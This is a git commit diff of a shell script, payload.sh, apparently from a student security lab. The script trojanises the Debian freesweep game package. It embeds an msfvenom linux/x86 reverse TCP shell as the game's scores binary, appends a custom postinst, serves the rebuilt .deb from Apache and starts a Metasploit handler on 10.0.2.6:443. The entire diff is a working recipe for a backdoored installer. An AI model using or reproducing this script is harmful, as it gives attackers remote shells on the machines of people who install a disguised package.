44e44ccb56eb720ebac6e48858894456065a1aa2
Ayinala <kapnb@mail.umkc.edu>
2018-10-10 22:30:24 -0500

    base files

--- payload.sh
+++ payload.sh
@@ -2,21 +2,19 @@ pwd=$(pwd)
 rm -rf /tmp/free*
 rm -rf /var/www/html/free*
 
-
-apt-get --download-only install freesweep:i386
-mkdir /tmp/freesweep
-mv /var/cache/apt/archives/freesweep_*.deb /tmp/freesweep
-cd /tmp/freesweep/
-dpkg -x freesweep_*.deb work
-mkdir work/DEBIAN
+apt-get --download-only install freesweep
+mkdir /tmp/evil
+cd /tmp/evil/
+dpkg -x freesweep_1.0.1-1_amd64.deb work
 cd work/DEBIAN/
 cat $pwd/control >> control
 cat $pwd/postinst >> postinst
-msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=$1 LPORT=443 -b "\x00" -f elf -o /tmp/freesweep/work/usr/games/freesweep_scores
+msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.2.6 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
 chmod 755 postinst
-dpkg-deb --build /tmp/freesweep/work
+dpkg-deb --build /tmp/evil/work
+mv work.deb freesweep.deb
 cd ../..
-mv freesweep_*.deb  freesweep.deb
-cp freesweep.deb /var/www/html
+mv work.deb freesweep.deb
+cp freesweep.deb /var/www/html/
 service apache2 start
-msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST $1; set LPORT 443; run; exit -y"
+msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.2.6; set LPORT 443; run; exit -y"
